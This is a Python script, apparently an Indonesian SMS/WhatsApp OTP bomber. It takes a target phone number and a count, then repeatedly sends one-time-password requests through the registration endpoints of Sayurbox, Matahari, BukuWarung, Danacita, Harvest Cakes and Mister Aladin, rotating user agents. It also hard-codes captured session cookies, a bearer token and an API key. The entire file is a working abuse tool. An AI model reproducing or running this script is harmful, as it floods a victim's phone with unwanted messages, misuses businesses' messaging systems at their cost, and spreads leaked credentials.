import os, sys, time, json, requests
from colorama import Fore, init
import random

init(autoreset=True)

def autotype(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.008)

B = Fore.BLUE
W = Fore.WHITE
R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW

ip = requests.get('https://api.ipify.org').text
api_visitor = 'https://api.api-ninjas.com/v1/counter?id=test_id&hit=true'
key_visitor = 'RFj75+sjo1hyWyBRuAkZhQ==d67tIuLmR53MDfjE'
visitor = requests.get(api_visitor, headers={'X-Api-Key': key_visitor})
getvisit = json.loads(visitor.text)
localtime = time.asctime(time.localtime(time.time()))

hijau = "\033[1;92m"
putih = "\033[1;97m"
biru = "\033[1;96m"
kuning = "\033[1;93m"

with open('ua.txt', 'r') as file:
    user_agents = [line.strip() for line in file.readlines()]
    
# Get target number and quantity
inputNomer = input(f"{W}[{R}• {kuning}•{hijau}•{W}] {biru}Nomor Target {W}: ")
inputJumlah = int(input(f"{W}[{R}• {kuning}•{hijau}•{W}] {biru}Jumlah {W}: "))
nomor_matahari = inputNomer.replace("+62", "0")
nomor_mraladin = inputNomer.replace("+62", "")

# Loop to send OTP requests
for i in range(inputJumlah):
    user_agent = random.choice(user_agents)
    # Sayurbox
    headers_sayurbox = {
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en,id-ID;q=0.9,id;q=0.8,en-US;q=0.7,es;q=0.6,zh-CN;q=0.5,zh;q=0.4,ms;q=0.3,ca;q=0.2,pt;q=0.1",
        "Authorization": "Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6ImY4NDY2MjEyMTQxMjQ4NzUxOWJiZjhlYWQ4ZGZiYjM3ODYwMjk5ZDciLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImF1ZCI6InNheXVyYm94LWF1ZGllbmNlIiwiYXV0aF90aW1lIjoxNzE5MDMzNDQ3LCJleHAiOjE3MjE2MjU0NDcsImlhdCI6MTcxOTAzMzQ0NywiaXNzIjoiaHR0cHM6Ly93d3cuc2F5dXJib3guY29tIiwibWV0YWRhdGEiOnsiZGV2aWNlX2luZm8iOm51bGwsInRlbmFudCI6ImIyYyJ9LCJuYW1lIjpudWxsLCJwaWN0dXJlIjpudWxsLCJwcm92aWRlcl9pZCI6ImFub255bW91cyIsInNpZCI6IjJkOWVlZGI0LTNmYjMtNDIzMi1hODFiLWY1NzljZDAyMzMwYiIsInN1YiI6ImFfcjB6RkF0cFRVa3NJUnlEWnlha1MxckQ2c3oiLCJ1c2VyX2lkIjoiYV9yMHpGQXRwVFVrc0lSeURaeWFrUzFyRDZzeiJ9.D5M7VAjb7mpyM2QsOpuBFWOXctqyMKUZLrhgZkm0CM-IuKe1GMMn8S9UJ3OOvLr3okl1KxQ87fH08mq8552Mx6MAq6Bgs_0KNDPqKxRc7Rqx7qLHIyBW20sKqbadIdOqmr7hKSGepkMUilx-MULvjFs1VMCRWUStqu8Zj-cohOSDIIaOBHZBJaAkrYSOZXVRq7gLsyeDJ9WWmovfsVWlLhyQmap7XztQmzq6AfcrI0R8NeK4SvH56fe9K-FC9KjYdVcJDC_O3VViWDqzCuJ5wHgTJwpGdpjC4jP-Eqp1iz-7bxXn9yx5OD6c2U2xB2wdNkgoOqKpixnVrSBzi15zAg",
        "Content-Type": "application/json",
        "Cookie": "perf_dv6Tr4n=1; _gcl_au=1.1.453795563.1718975654; _ga=GA1.1.1863538960.1718975654; _fbp=fb.1.1718975655048.519782181988016639; afUserId=ce18733b-0c78-451f-9579-c6300baa97db-p; AF_SYNC=1718975655764; _sbox_lang=id; __cnf=cnf0927; token=eyJhbGciOiJSUzI1NiIsImtpZCI6ImY4NDY2MjEyMTQxMjQ4NzUxOWJiZjhlYWQ4ZGZiYjM3ODYwMjk5ZDciLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImF1ZCI6InNheXVyYm94LWF1ZGllbmNlIiwiYXV0aF90aW1lIjoxNzE5MDMzNDQ3LCJleHAiOjE3MjE2MjU0NDcsImlhdCI6MTcxOTAzMzQ0NywiaXNzIjoiaHR0cHM6Ly93d3cuc2F5dXJib3guY29tIiwibWV0YWRhdGEiOnsiZGV2aWNlX2luZm8iOm51bGwsInRlbmFudCI6ImIyYyJ9LCJuYW1lIjpudWxsLCJwaWN0dXJlIjpudWxsLCJwcm92aWRlcl9pZCI6ImFub255bW91cyIsInNpZCI6IjJkOWVlZGI0LTNmYjMtNDIzMi1hODFiLWY1NzljZDAyMzMwYiIsInN1YiI6ImFfcjB6RkF0cFRVa3NJUnlEWnlha1MxckQ2c3oiLCJ1c2VyX2lkIjoiYV9yMHpGQXRwVFVrc0lSeURaeWFrUzFyRDZzeiJ9.D5M7VAjb7mpyM2QsOpuBFWOXctqyMKUZLrhgZkm0CM-IuKe1GMMn8S9UJ3OOvLr3okl1KxQ87fH08mq8552Mx6MAq6Bgs_0KNDPqKxRc7Rqx7qLHIyBW20sKqbadIdOqmr7hKSGepkMUilx-MULvjFs1VMCRWUStqu8Zj-cohOSDIIaOBHZBJaAkrYSOZXVRq7gLsyeDJ9WWmovfsVWlLhyQmap7XztQmzq6AfcrI0R8NeK4SvH56fe9K-FC9KjYdVcJDC_O3VViWDqzCuJ5wHgTJwpGdpjC4jP-Eqp1iz-7bxXn9yx5OD6c2U2xB2wdNkgoOqKpixnVrSBzi15zAg; localSessionId=lk0uc8P05F_9Iagy1q7kK:1719033426572; localSessionIdExpire=1719033426572; _ga_RG03K1J7BE=GS1.1.1719033426.2.0.1719033426.0.0.0; _ga_MHTN2YH4H8=GS1.1.1719033427.3.1.1719033901.60.0.0",
        "Origin": "https://www.sayurbox.com",
        "Sec-Ch-Ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": user_agent,
        "X-Binary-Version": "2.21.2",
        "X-Bundle-Revision": "60.4",
        "X-Device-Info": "{\"platform\":\"web\",\"is_app\":false,\"is_mobile\":false,\"device_type\":\"desktop\",\"device_id\":\"lk0uc8P05F_9Iagy1q7kK\",\"os_name\":\"Windows\",\"os_version\":\"NT 10.0\",\"brand\":null,\"model\":null,\"pixel_density\":1.125,\"client_ip\":\"::ffff:10.10.202.18\"}",
        "X-Sbox-Lang": "id",
        "X-Sbox-Tenant": "b2c",
        "X-Supported-Delivery": "NEXTDAY,SAMEDAY,INSTANT"
    }
    data_sayurbox = json.dumps({
        "operationName": "generateOTP",
        "variables": {
            "destinationType": "whatsapp",
            "identity": inputNomer
        },
        "query": "mutation generateOTP($destinationType: String!, $identity: String!) {\n  generateOTP(destinationType: $destinationType, identity: $identity) {\n    id\n    __typename\n  }\n}"
    })
    response_sayurbox = requests.post("https://www.sayurbox.com/graphql/v1?deduplicate=1", headers=headers_sayurbox, data=data_sayurbox)
    if response_sayurbox.status_code == 200:
        print(f"{G}Berhasil mengirim SMS/WA via SayurBox")
    else:
        print(f"{R}Gagal mengirim SMS/WA via SayurBox")

    # Matahari
    headers_matahari = {
        "Host": "www.matahari.com",
        "content-length": "76",
        "x-newrelic-id": "Vg4GVFVXDxAGVVlVBgcGVlY=",
        "sec-ch-ua-mobile": "?1",
        "user-agent": user_agent,
        "content-type": "application/json",
        "accept": "*/*",
        "x-requested-with": "XMLHttpRequest",
        "sec-ch-ua-platform": "Android",
        "origin": "https://www.matahari.com",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://www.matahari.com/customer/account/create/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    data_matahari = json.dumps({
        "otp_request": {
            "mobile_number": nomor_matahari,
            "mobile_country_code": "+62"
        }
    })
    response_matahari = requests.post("https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp", headers=headers_matahari, data=data_matahari)
    if response_matahari.status_code == 200:
        print(f"{G}Berhasil mengirim SMS/WA via Matahari")
    else:
        print(f"{R}Gagal mengirim SMS/WA via Matahari")

    # BukuWarung
    headers_bukuwarung = {
        "Host": "api-v2.bukuwarung.com",
        "content-length": "198",
        "sec-ch-ua-mobile": "?1",
        "user-agent": user_agent,
        "content-type": "application/json",
        "x-app-version-name": "android",
        "accept": "application/json, text/plain, */*",
        "x-app-version-code": "3001",
        "buku-origin": "tokoko-web",
        "sec-ch-ua-platform": "Android",
        "origin": "https://tokoko.id",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    data_bukuwarung = json.dumps({
        "operationName": "sendVerification",
        "variables": {
            "phone": inputNomer
        },
        "query": "mutation sendVerification($phone: String!) {\n  sendVerification(phone: $phone) {\n    success\n    errors\n  }\n}"
    })
    response_bukuwarung = requests.post("https://api-v2.bukuwarung.com/graphql", headers=headers_bukuwarung, data=data_bukuwarung)
    if response_bukuwarung.status_code == 200:
        print(f"{G}Berhasil mengirim SMS/WA via BukuWarung")
    else:
        print(f"{R}Gagal mengirim SMS/WA via BukuWarung")
        
    headers_danacita = {
        "Accept": "application/json, text/plain, */*",
		"Accept-Encoding": "gzip, deflate, br, zstd",
		"Accept-Language": "en,id-ID;q=0.9,id;q=0.8,en-US;q=0.7,es;q=0.6,zh-CN;q=0.5,zh;q=0.4,ms;q=0.3,ca;q=0.2,pt;q=0.1",
		"Content-Length": "29",
		"Content-Type": "application/json",
		"Cookie": "perf_dv6Tr4n=1; _gcl_au=1.1.299491486.1718981705; amp_9bff24=fjpJStzg7d0dPa_dnFg6iA...1i0tkmf66.1i0tkmf66.0.0.0; _gid=GA1.3.369937539.1718981705; _gat_UA-106864485-1=1; _fbp=fb.2.1718981705473.187369508323616691; _ce.irv=new; cebs=1; _ce.clock_event=1; _ce.clock_data=-20881%2C180.244.163.61%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CID; _ga_M6EGHSCWF7=GS1.1.1718981704.1.0.1718981707.57.0.0; ph_phc_3JD9yqRALGfavssFolNlgAlqrFJxXWoSMRypaScrcHv_posthog=%7B%22distinct_id%22%3A%2201903b4b-3f0f-7fa8-a1e6-cc2a3548dc7a%22%2C%22%24sesid%22%3A%5B1718981707346%2C%2201903b4b-3f0e-761c-b6cb-fefc0d30c1ea%22%2C1718981705486%5D%7D; _ga=GA1.1.1289089611.1718981705; cebsp_=2; _ga_V9673QHFM5=GS1.1.1718981704.1.1.1718981726.38.0.0; _ce.s=v~26dae470825c19828984ea7d7dbfd066418b156c~lcw~1718981725996~lva~1718981706613~vpv~0~as~false~v11.fhb~1718981707034~v11.lhb~1718981708592~v11.cs~356027~v11.s~3fbcd5c0-2fde-11ef-9586-414381f673c0~gtrk.la~lxotc4r2~v11.sla~1718981725996~lcw~1718981726222",
		"Origin": "https://app.danacita.co.id",
		"Referer": "https://app.danacita.co.id/",
		"Sec-Ch-Ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
		"Sec-Ch-Ua-Mobile": "?0",
		"Sec-Ch-Ua-Platform": "\"Windows\"",
		"Sec-Fetch-Dest": "empty",
		"Sec-Fetch-Mode": "cors",
		"Sec-Fetch-Site": "same-site",
		"User-Agent": user_agent
	}
    
    data_danacita = json.dumps({
        "username": inputNomer,
	})
    
    
    response_danacita = requests.post("https://api.danacita.co.id/v4/users/mobile_register/", headers=headers_danacita, data=data_danacita)
    if response_danacita.status_code == 200:
        print(f"{G}Berhasil mengirim SMS/WA via Danacita")
    else:
        print(f"{R}Gagal mengirim SMS/WA via Danacita")
        
    headers_harvest = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		"Accept-Encoding": "gzip, deflate, br, zstd",
		"Accept-Language": "en,id-ID;q=0.9,id;q=0.8,en-US;q=0.7,es;q=0.6,zh-CN;q=0.5,zh;q=0.4,ms;q=0.3,ca;q=0.2,pt;q=0.1",
		"Cache-Control": "max-age=0",
		"Content-Type": "application/x-www-form-urlencoded",
		"Cookie": "csrftoken=KdP64VLyAiPT85WSG8bV812VsmXHa4LIQHk9u9l0v0K7SX0VjKmKarzSEypuCeuh; _gid=GA1.2.1605440401.1718977455; _ga_S87G2283KK=GS1.1.1718982268.2.0.1718982268.0.0.0; _ga_K2VKG4DW9K=GS1.1.1718982268.2.0.1718982268.0.0.0; _ga=GA1.2.1215605141.1718977455; _gat_gtag_UA_234451190_1=1",
		"Origin": "https://harvestcakes.com",
		"Referer": "https://harvestcakes.com/register/",
		"Sec-Ch-Ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
		"Sec-Ch-Ua-Mobile": "?0",
		"Sec-Ch-Ua-Platform": "\"Windows\"",
		"Sec-Fetch-Dest": "document",
		"Sec-Fetch-Mode": "navigate",
		"Sec-Fetch-Site": "same-origin",
		"Sec-Fetch-User": "?1",
		"Upgrade-Insecure-Requests": "1",
		"User-Agent": user_agent
	}
    
    data_harvest = json.dumps({
        "phone": inputNomer
	})
    
    response_harvest = requests.post("https://harvestcakes.com/register", headers=headers_harvest, data=data_harvest)
    if response_harvest.status_code == 200:
        print(f"{G}Berhasil mengirim SMS/WA via Harvest")
    else:
        print(f"{R}Gagal mengirim SMS/WA via Harvest")
        
    headers_misterAladin = {
        "Accept": "application/json, text/plain, */*",
		"Accept-Encoding": "gzip, deflate, br, zstd",
		"Accept-Language": "id",
		"Authorization": "Bearer null", 
		"Content-Type": "application/json;charset=UTF-8",
		"Cookie": "click_id=968535b92ee8434bb50499ee5345a3a0; offer_id=103180; __cfruid=2c8d601f3c353e3700511a915518532a926131be-1718982782; utm_medium=1637-968535b92ee8434bb50499ee5345a3a0; utm_source=involveasia; _ga=GA1.2.40616470.1718982768; _gid=GA1.2.1272049545.1718982768; _gat=1; Lda_aKUr6BGRn=everydaysi.com/r/v2?; _ga_PLKRYTK7YG=GS1.2.1718982768.1.1.1718982777.51.0.0; G_ENABLED_IDPS=google",
		"Origin": "https://www.misteraladin.com",
		"Referer": "https://www.misteraladin.com/register",
		"Sec-Ch-Ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
		"Sec-Ch-Ua-Mobile": "?0",
		"Sec-Ch-Ua-Platform": "\"Windows\"",
		"Sec-Fetch-Dest": "empty",
		"Sec-Fetch-Mode": "cors",
		"Sec-Fetch-Site": "same-origin",
		"User-Agent": user_agent,
		"X-Platform": "web"
	}
    
    data_misterAladin = json.dumps({
        "phone_number": nomor_mraladin,
        "phone_number_country_code": "62",
        "type": "register"
	})
    
    response_mraladin = requests.post("https://www.misteraladin.com/api/members/v2/otp/request", headers=headers_misterAladin, data=data_misterAladin)
    if response_mraladin.status_code == 200:
        print(f"{G}Berhasil mengirim SMS/WA via Mister Aladin")
    else: 
        print(f"{R}Gagal mengirim SMS/WA via Mister Aladin")

    
